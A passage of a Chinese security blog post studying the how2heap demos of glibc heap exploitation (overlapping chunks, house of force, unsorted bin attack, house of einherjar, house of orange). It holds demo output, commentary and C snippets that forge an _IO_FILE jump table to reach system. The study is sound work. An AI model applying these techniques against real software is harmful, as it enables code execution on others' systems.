class="string">FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC</span></span><br></pre></td></tr></table></figure>
+
+<p>首先申请5个1000大小的chunk，p1到p5</p>
+<p>之后分别用A，B，C，D，E，F填充</p>
+<p>free p4</p>
+<p>之后改写p2的size为p2+p3的真实大小+0x10+prev_in_use（1）</p>
+<p>其中0x10是两个堆的size的大小</p>
+<p>再 free掉p2，它就以为p2的下一个是p4了</p>
+<p>我们再malloc一个2000大小的——p6，那么p6跟p3就重叠了，可以互相修改</p>
+<p><img src="http://pic.giantbranch.cn/pic/1511518758786.jpg" alt></p>
+<h1 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house_of_force"></a>house_of_force</h1><p>这个是覆盖top chunk从而使malloc返回的值能够控制</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">Welcome to the House of Force</span><br><span class="line"></span><br><span class="line">The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.</span><br><span class="line">The top chunk is a special chunk. Is the last in memory and is the chunk that will be resized when malloc asks for more space from the os.</span><br><span class="line"></span><br><span class="line">In the <span class="keyword">end</span>, we will <span class="keyword">use</span> this <span class="keyword">to</span> overwrite a <span class="keyword">variable</span> <span class="keyword">at</span> <span class="number">0x5636c2d20060</span>.</span><br><span class="line">Its <span class="keyword">current</span> <span class="keyword">value</span> <span class="keyword">is</span>: This <span class="keyword">is</span> a <span class="keyword">string</span> that we want <span class="keyword">to</span> overwrite.</span><br><span class="line"></span><br><span class="line">Let<span class="string">'s allocate the first chunk, taking space from the wilderness.</span></span><br><span class="line"><span class="string">The chunk of 256 bytes has been allocated at 0x5636c35b2420.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Now the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.</span></span><br><span class="line"><span class="string">Real size (aligned and all that jazz) of our allocated chunk is 264.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Now let'</span>s emulate a vulnerability that can overwrite the header <span class="keyword">of</span> the Top <span class="keyword">Chunk</span></span><br><span class="line"></span><br><span class="line">The top <span class="keyword">chunk</span> starts <span class="keyword">at</span> <span class="number">0x5636c35b2528</span></span><br><span class="line"></span><br><span class="line">Overwriting the top <span class="keyword">chunk</span> <span class="keyword">size</span> <span class="keyword">with</span> a <span class="keyword">big</span> <span class="keyword">value</span> so we can ensure that the malloc will <span class="keyword">never</span> <span class="keyword">call</span> mmap.</span><br><span class="line"><span class="keyword">Old</span> <span class="keyword">size</span> <span class="keyword">of</span> top <span class="keyword">chunk</span> <span class="number">0x20ae1</span></span><br><span class="line"><span class="keyword">New</span> <span class="keyword">size</span> <span class="keyword">of</span> top <span class="keyword">chunk</span> <span class="number">0xffffffffffffffff</span></span><br><span class="line"></span><br><span class="line">The <span class="keyword">size</span> <span class="keyword">of</span> the wilderness <span class="keyword">is</span> <span class="keyword">now</span> gigantic. We can <span class="keyword">allocate</span> anything <span class="keyword">without</span> malloc() <span class="keyword">calling</span> mmap.</span><br><span class="line"><span class="keyword">Next</span>, we will <span class="keyword">allocate</span> a <span class="keyword">chunk</span> that will <span class="keyword">get</span> us <span class="keyword">right</span> up against the desired region (<span class="keyword">with</span> an <span class="built_in">integer</span></span><br><span class="line"><span class="keyword">overflow</span>) <span class="keyword">and</span> will <span class="keyword">then</span> be able <span class="keyword">to</span> <span class="keyword">allocate</span> a <span class="keyword">chunk</span> <span class="keyword">right</span> <span class="keyword">over</span> the desired region.</span><br><span class="line"></span><br><span class="line">The <span class="keyword">value</span> we want <span class="keyword">to</span> write <span class="keyword">to</span> <span class="keyword">at</span> <span class="number">0x5636c2d20060</span>, <span class="keyword">and</span> the top <span class="keyword">chunk</span> <span class="keyword">is</span> <span class="keyword">at</span> <span class="number">0x5636c35b2528</span>, so accounting <span class="keyword">for</span> the header <span class="keyword">size</span>,</span><br><span class="line">we will malloc <span class="number">0xffffffffff76db28</span> bytes.</span><br><span class="line"><span class="keyword">As</span> expected, the <span class="keyword">new</span> pointer <span class="keyword">is</span> <span class="keyword">at</span> the same place <span class="keyword">as</span> the <span class="keyword">old</span> top <span class="keyword">chunk</span>: <span class="number">0x5636c35b2530</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Now</span>, the <span class="keyword">next</span> <span class="keyword">chunk</span> we overwrite will point <span class="keyword">at</span> our target buffer.</span><br><span class="line">malloc(<span class="number">100</span>) =&gt; <span class="number">0x5636c2d20060</span>!</span><br><span class="line"><span class="keyword">Now</span>, we can finally overwrite that <span class="keyword">value</span>:</span><br><span class="line">... <span class="keyword">old</span> <span class="keyword">string</span>: This <span class="keyword">is</span> a <span class="keyword">string</span> that we want <span class="keyword">to</span> overwrite.</span><br><span class="line">... doing strcpy overwrite <span class="keyword">with</span> <span class="string">"YEAH!!!"</span>...</span><br><span class="line">... <span class="keyword">new</span> <span class="keyword">string</span>: YEAH!!</span><br></pre></td></tr></table></figure>
+
+<p>先申请了256个字节的chunk，那么就有这个chunk和top chunk了</p>
+<p>之后将top chunk的size改为0xffffffffffffffff，这样我们malloc很大的值也不用mmap了</p>
+<p>之后申请一个0xffffffffff76db28byte的，这是一个负数，所以top chunk的大小会减去这么一个值，但是第一次申请的时候malloc还是返回原理top chunk的位置</p>
+<p>那么当我们再次申请的时候，top chunk就返回了我们想要的地址了</p>
+<p>那个负数是怎么得来的呢？</p>
+<p>因为我们malloc之后，top指针会加上我们的size，所以我们只需要malloc我们想要的地址跟top指针的差别再减0x10的头部就行了</p>
+<h1 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted_bin_attack"></a>unsorted_bin_attack</h1><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">This file demonstrates unsorted bin attack <span class="keyword">by</span> write a large unsigned <span class="built_in">long</span> value <span class="keyword">into</span> stack</span><br><span class="line"><span class="keyword">In</span> practice, unsorted bin attack <span class="keyword">is</span> generally prepared <span class="keyword">for</span> further attacks, such <span class="keyword">as</span> rewriting the <span class="keyword">global</span> variable global_max_fast <span class="keyword">in</span> libc <span class="keyword">for</span> further fastbin attack</span><br><span class="line"></span><br><span class="line"><span class="keyword">Let</span><span class="comment">'s first look at the target we want to rewrite on stack:</span></span><br><span class="line"><span class="number">0x7ffd0cdf2c90</span>: <span class="number">0</span></span><br><span class="line"></span><br><span class="line">Now, we allocate first normal chunk <span class="keyword">on</span> the heap at: <span class="number">0x556217e0e420</span></span><br><span class="line"><span class="keyword">And</span> allocate another normal chunk <span class="keyword">in</span> <span class="keyword">order</span> <span class="keyword">to</span> avoid consolidating the top chunk withthe first one during the free()</span><br><span class="line"></span><br><span class="line">We free the first chunk now <span class="keyword">and</span> it will be inserted <span class="keyword">in</span> the unsorted bin <span class="keyword">with</span> its bk pointer point <span class="keyword">to</span> <span class="number">0x7fa01c57cb58</span></span><br><span class="line">Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer</span><br><span class="line"><span class="keyword">And</span> we write it <span class="keyword">with</span> the target address<span class="number">-16</span> (<span class="keyword">in</span> <span class="number">32</span>-bits machine, it should be target address<span class="number">-8</span>):<span class="number">0x7ffd0cdf2c80</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Let</span><span class="comment">'s malloc again to get the chunk we just free. During this time, target should has already been rewrite:</span></span><br><span class="line"><span class="number">0x7ffd0cdf2c90</span>: <span class="number">0x7fa01c57cb58</span></span><br></pre></td></tr></table></figure>
+
+<p>作者说通常unsorted_bin_attack是为进一步利用做准备的，比如libc中的全局变量global_max_fast，之后再执行fastbin attack</p>
+<p>给出的例子的话是覆盖栈上的局部变量</p>
+<p>首先申请两个chunk，为的是避免free之后合并到top chunk了</p>
+<p>跟着我们free掉第一个，那么他就会放到unsorted bin中，而此时我们的chunk有了fd和bk指针</p>
+<p><img src="http://pic.giantbranch.cn/pic/1511679691574.jpg" alt></p>
+<p>假如我们可以有漏洞去覆盖bk，例子是覆盖栈变量指针减0x10的地址，那么结构如下</p>
+<p>unsort bin ——&gt; p ——&gt; stack</p>
+<p>那么我们再malloc一次，那么stack的fd就会被修改为unsort bin的头，这样就能让p脱链</p>
+<h1 id="house-of-einherjar"><a href="#house-of-einherjar" class="headerlink" title="house_of_einherjar"></a>house_of_einherjar</h1><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">Welcome <span class="keyword">to</span> House <span class="keyword">of</span> Einherjar!</span><br><span class="line">Tested <span class="keyword">in</span> Ubuntu <span class="number">16.04</span> <span class="number">64</span>bit.</span><br><span class="line">This technique can be used <span class="keyword">when</span> you have an <span class="keyword">off</span>-<span class="keyword">by</span>-one <span class="keyword">into</span> a malloc<span class="comment">'ed region with a null byte.</span></span><br><span class="line"></span><br><span class="line">We allocate <span class="number">0x38</span> bytes <span class="keyword">for</span> <span class="comment">'a'</span></span><br><span class="line">a: <span class="number">0x558424b51420</span></span><br><span class="line">Since we want <span class="keyword">to</span> overflow <span class="comment">'a', we need the 'real' size of 'a' after rounding: 0x38</span></span><br><span class="line"></span><br><span class="line">We create a fake chunk wherever we want, <span class="keyword">in</span> this <span class="keyword">case</span> we<span class="comment">'ll create the chunk on the stack</span></span><br><span class="line">However, you can also create the chunk <span class="keyword">in</span> the heap <span class="keyword">or</span> the bss, <span class="keyword">as</span> <span class="built_in">long</span> <span class="keyword">as</span> you know its address</span><br><span class="line">We <span class="keyword">set</span> our fwd <span class="keyword">and</span> bck pointers <span class="keyword">to</span> point at the fake_chunk <span class="keyword">in</span> <span class="keyword">order</span> <span class="keyword">to</span> pass the unlink checks</span><br><span class="line">(although we could <span class="keyword">do</span> the unsafe unlink technique here <span class="keyword">in</span> some scenarios)</span><br><span class="line">Our fake chunk at <span class="number">0x7fffc6178c70</span> looks <span class="keyword">like</span>:</span><br><span class="line">prev_size (<span class="keyword">not</span> used): <span class="number">0x100</span></span><br><span class="line">size: <span class="number">0x100</span></span><br><span class="line">fwd: <span class="number">0x7fffc6178c70</span></span><br><span class="line">bck: <span class="number">0x7fffc6178c70</span></span><br><span class="line">fwd_nextsize: <span class="number">0x7fffc6178c70</span></span><br><span class="line">bck_nextsize: <span class="number">0x7fffc6178c70</span></span><br><span class="line"></span><br><span class="line">We allocate <span class="number">0xf8</span> bytes <span class="keyword">for</span> <span class="comment">'b'.</span></span><br><span class="line">b: <span class="number">0x558424b51460</span></span><br><span class="line"></span><br><span class="line">b.size: <span class="number">0x101</span></span><br><span class="line">b.size <span class="keyword">is</span>: (<span class="number">0x100</span>) | prev_inuse = <span class="number">0x101</span></span><br><span class="line">We overflow <span class="comment">'a' with a single null byte into the metadata of 'b'</span></span><br><span class="line">b.size: <span class="number">0x100</span></span><br><span class="line">This <span class="keyword">is</span> easiest <span class="keyword">if</span> b.size <span class="keyword">is</span> a multiple <span class="keyword">of</span> <span class="number">0x100</span> so you don<span class="comment">'t change the size of b, only its prev_inuse bit</span></span><br><span class="line"><span class="keyword">If</span> it had been modified, we would need a fake chunk inside b <span class="keyword">where</span> it will <span class="keyword">try</span> <span class="keyword">to</span> consolidate the <span class="keyword">next</span> chunk</span><br><span class="line"></span><br><span class="line">We write a fake prev_size <span class="keyword">to</span> the last <span class="number">8</span> bytes <span class="keyword">of</span> a so that it will consolidate <span class="keyword">with</span> our fake chunk</span><br><span class="line">Our fake prev_size will be <span class="number">0x558424b51450</span> - <span class="number">0x7fffc6178c70</span> = <span class="number">0xffffd5845e9d87e0</span></span><br><span class="line"></span><br><span class="line">Modify fake chunk<span class="comment">'s size to reflect b's new prev_size</span></span><br><span class="line">Now we free b <span class="keyword">and</span> this will consolidate <span class="keyword">with</span> our fake chunk since b prev_inuse <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">set</span></span><br><span class="line">Our fake chunk size <span class="keyword">is</span> now <span class="number">0xffffd5845e9f9391</span> (b.size + fake_prev_size)</span><br><span class="line"></span><br><span class="line">Now we can <span class="keyword">call</span> malloc() <span class="keyword">and</span> it will begin <span class="keyword">in</span> our fake chunk</span><br><span class="line"><span class="keyword">Next</span> malloc(<span class="number">0x200</span>) <span class="keyword">is</span> at <span class="number">0x7fffc6178c80</span></span><br></pre></td></tr></table></figure>
+
+<p>这个可以用于有off by one的程序，从而让我们有机会修改prev_inuse</p>
+<p>首先申请0x38个byte——chunk a，这个是为off by one做准备的，之后这样我们才有机会溢出下一个chunk的头部</p>
+<p>之后在栈上伪造了一个fake chunk（当然实际的时候我们在heap或者bss上伪造也行，只要知道地址），fd和bk都指向自己</p>
+<p>之后申请0xf8大小的chunk——chunk b，</p>
+<p>我们通过a一个空字节溢出b，那么b的prev_inuse bit就置0，以为前面的chunk是空闲的了</p>
+<p>之后我们再修改b的prev size，那么最终就会控制合并后的地址了</p>
+<p>因为合并的时候，是先找前一个chunk在哪，我们让它计算的时候找到栈上去了</p>
+<p>所以最后再malloc，就会返回我们想要的栈地址了</p>
+<h1 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house_of_orange"></a>house_of_orange</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The House of Orange uses an overflow in the heap to corrupt the _IO_list_all pointer</span><br></pre></td></tr></table></figure>
+
+<p>这个技术是利用溢出，去破坏<code>_IO_list_all</code>指针，需要泄露heap跟libc</p>
+<p>top chunk一般最开始是0x21000大小的</p>
+<p>首先申请0x400-16，那么top chunk就从最开始的0x21000，剩余0x20c00，当然有PREV_INUSE标志位就是0x20c01 </p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p1 = malloc(<span class="number">0x400</span><span class="number">-16</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://pic.giantbranch.cn/pic/1511683728339.jpg" alt></p>
+<p>之后我们将top chunk的大小改为0xc01</p>
+<p>接下来再malloc一个比这个size大的chunk，这时候原来的top chunk就会被free到unsort bin中</p>
+<p>这个技术是故意让堆检测到异常，之后就会调用<code>_IO_flush_all_lockp</code>，最后遍历<code>_IO_list_all</code>，找到<code>_IO_OVERFLOW</code>函数去掉用，这个函数是相当于虚表里面的，所以我们可以伪造一个 <code>_IO_list_all</code>，让他去调用system函数</p>
+<p>伪造<code>_IO_list_all</code>，我们需要改写它的指针，它可以通过fd或者bk来计算出来</p>
+<p>我们需要覆盖old top chunk满足chunk-&gt;bk-&gt;fd指向 <code>_IO_list_all</code>,所以我们覆盖old top chunk的bk为io_list_all - 0x10</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">top[3] = io_list_all - 0x10;</span><br></pre></td></tr></table></figure>
+
+<p>之后将old top chunk的前8个字节覆盖为”/bin/sh\x00”</p>
+<p><code>_IO_flush_all_lockp</code>会遍历<code>_IO_list_all</code>中的文件指针，因为我们只能用main_arena的unsorted -bin- list覆盖这个地址，所以这个想法是为了控制在相应的fd - ptr上的内存。下一个文件指针的地址位于base_address 0x68。这相当于smallbin<a href="http://pic.giantbranch.cn/pic/1511509778609.jpg" target="_blank" rel="noopener">4</a></p>
+<p>再将old top chunk的size设置为0x61,将其强制转换为<code>_IO_FILE</code>指针</p>
+<ol>
+<li>Set mode to 0: fp-&gt;_mode &lt;= 0</li>
+<li>Set write_base to 2 and write_ptr to </li>
+<li>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</li>
+</ol>
+<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_IO_write_base = (char *) 2; // top+0x20</span><br><span class="line">fp-&gt;_IO_write_ptr = (char *) 3; // top+0x28</span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li>Finally set the jump table to controlled memory and place system there.<br>   The jump table pointer is right after the _IO_FILE struct:<br>   base_address+sizeof(_IO_FILE) = jump_table</li>
+</ol>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> *jump_table = &amp;top[<span class="number">12</span>]; <span class="comment">// controlled memory</span></span><br><span class="line">jump_table[<span class="number">3</span>] = (<span class="keyword">size_t</span>) &amp;winner;	<span class="comment">//_IO_OVERFLOW  的地址</span></span><br><span class="line">*(<span class="keyword">size_t</span> *) ((<span class="keyword">size_t</span>) fp + <span class="keyword">sizeof</span>(_IO_FILE)) = (<span class="keyword">size_t</span>) jump_table; <span class="comment">// top+0xd8  将jump table覆盖</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="http://pic.giantbranch.cn/pic/1511690210646.jpg" alt></p>
+<p>最后通过malloc触发</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>自愿打赏专区</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="http://paypic.giantbranch.cn/wechat.png" alt="giantbranch 微信支付">
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="http://paypic.giantbranch.cn/alipay.png" alt="giantbranch 支付宝">
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+    
+      <div class="footer-custom">
+        <b>paypal: <a href="https://www.paypal.me/giantbranch">https://www.paypal.me/giantbranch</a> </b>
+      </div>
+    
+
+    
+    <div style="padding: 10px 0; margin: 20px auto; width: 100%; text-align: center;">
+    	<div><img src="http://paypic.giantbranch.cn/ask.png"></div>
+    </div>
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    giantbranch
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://www.giantbranch.cn/2017/09/29/how2heap学习/" title="how2heap学习">https://www.giantbranch.cn/2017/09/29/how2heap学习/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn/" rel="tag"># pwn</a>
+          
+            <a href="/tags/how2heap/" rel="tag"># how2heap</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/09/27/Microsoft Windows CVE-2017-8710 XXE Information Disclosure 漏洞分析/" rel="next" title="Microsoft Windows CVE-2017-8710 XXE Information Disclosure 漏洞分析">
+                <i class="fa fa-chevron-left"></i> Microsoft Windows CVE-2017-8710 XXE Information Disclosure 漏洞分析
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/10/11/在Windows下编译 Firefox/" rel="prev" title="在Windows下编译 Firefox">
+                在Windows下编译 Firefox <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        
+  <div class="bdsharebuttonbox">
+    <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+    <a href="#" class="bds_douban" data-cmd="douban" title="分享到豆瓣网"></a>
+    <a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+    <a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
+    <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+    <a href="#" class="bds_tieba" data-cmd="tieba" title="分享到百度贴吧"></a>
+    <a href="#" class="bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+    <a href="#" class="bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+    <a href="#" class="bds_more" data-cmd="more"></a>
+    <a class="bds_count" data-cmd="count"></a>
+  </div>
+  <script>
+    window._bd_share_config = {
+      "common": {
+        "bdText": "",
+        "bdMini": "2",
+        "bdMiniList": false,
+        "bdPic": ""
+      },
+      "share": {
+        "bdSize": "16",
+        "bdStyle": "0"
+      },
+      "image": {
+        "viewList": ["tsina", "douban", "sqq", "qzone", "weixin", "twi", "fbook"],
+        "viewText": "分享到：",
+        "viewSize": "16"
+      }
+    }
+  </script>
+
+<script>
+  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//bdimg.share.baidu.com/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+
+      
+    </div>
+    <div class="footer-custom">
+	<b>假如你看不到评论，可能是你访问Disqus被墙了，请使用代理访问</b>
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  
+    <div class="comments" id="comments">
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    </div>
+  
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">giantbranch</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">160</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">201</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          <div class="links-of-author motion-element">
+            
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/giantbranch" target="_blank" title="GitHub">
+                    
+                      <i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="https://twitter.com/giantbranch" target="_blank" title="Twitter">
+                    
+                      <i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                </span>
+              
+            
+          </div>
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-globe"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://blog.csdn.net/u012763794" title="my csdn blog" target="_blank">my csdn blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://oldblog.giantbranch.cn/" title="old blog" target="_blank">old blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://weaponx.site/" title="WeaponX" target="_blank">WeaponX</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.tasfa.cn/" title="Tasfa" target="_blank">Tasfa</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://matshao.com/" title="MatShao" target="_blank">MatShao</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#first-fit"><span class="nav-number">1.</span> <span class="nav-text">first_fit</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#fastbin-dup"><span class="nav-number">2.</span> <span class="nav-text">fastbin_dup</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#fastbin-dup-into-stack"><span class="nav-number">3.</span> <span class="nav-text">fastbin_dup_into_stack</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#问题"><span class="nav-number">3.1.</span> <span class="nav-text">问题</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#unsafe-unlink"><span class="nav-number">4.</span> <span class="nav-text">unsafe_unlink</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#house-of-spirit"><span class="nav-number">5.</span> <span class="nav-text">house_of_spirit</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#poison-null-byte"><span class="nav-number">6.</span> <span class="nav-text">poison_null_byte</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#house-of-lore"><span class="nav-number">7.</span> <span 